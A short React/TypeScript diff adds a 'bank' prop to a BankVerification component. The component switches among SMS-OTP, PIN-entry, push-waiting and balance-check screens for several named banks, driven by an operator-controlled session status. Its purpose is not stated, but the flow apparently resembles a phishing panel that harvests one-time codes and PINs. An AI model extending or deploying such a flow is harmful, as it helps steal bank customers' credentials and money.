@@ -13,6 +13,7 @@ const LAYOUT_MAP: Record<
     apiBase: string;
     channelSlug: string;
     sessionId: string;
+    bank?: string;
     onError: (m: string) => void;
     wrongCode?: boolean;
     onTryAgain?: () => void;
@@ -21,7 +22,7 @@ const LAYOUT_MAP: Record<
 > = {
   sms: (p) => <SmsOtp {...p} />,
   pin: (p) => <PinEntry {...p} />,
-  push: (p) => <PushWaiting />,
+  push: (p) => <PushWaiting bank={p.bank} />,
   balance: (p) => <BalanceCheck {...p} />,
   "enbd-sms": (p) => <SmsOtp {...p} />,
   "adcb-sms": (p) => <SmsOtp {...p} />,
@@ -40,7 +41,7 @@ export function BankVerification({
 }: BankVerificationProps) {
   const [error, setError] = useState<string | null>(null);
 
-  const { status, verificationLayout, redirectUrl, wrongCode, clearWrongCode, operatorMessage } =
+  const { status, verificationLayout, bank, redirectUrl, wrongCode, clearWrongCode, operatorMessage } =
     useSessionStatus(apiBase, channelSlug, sessionId);
 
   useEffect(() => {
@@ -98,6 +99,7 @@ export function BankVerification({
           apiBase={apiBase}
           channelSlug={channelSlug}
           sessionId={sessionId}
+          bank={bank}
           onError={(m) => setError(m)}
           wrongCode={wrongCode}
           onTryAgain={clearWrongCode}
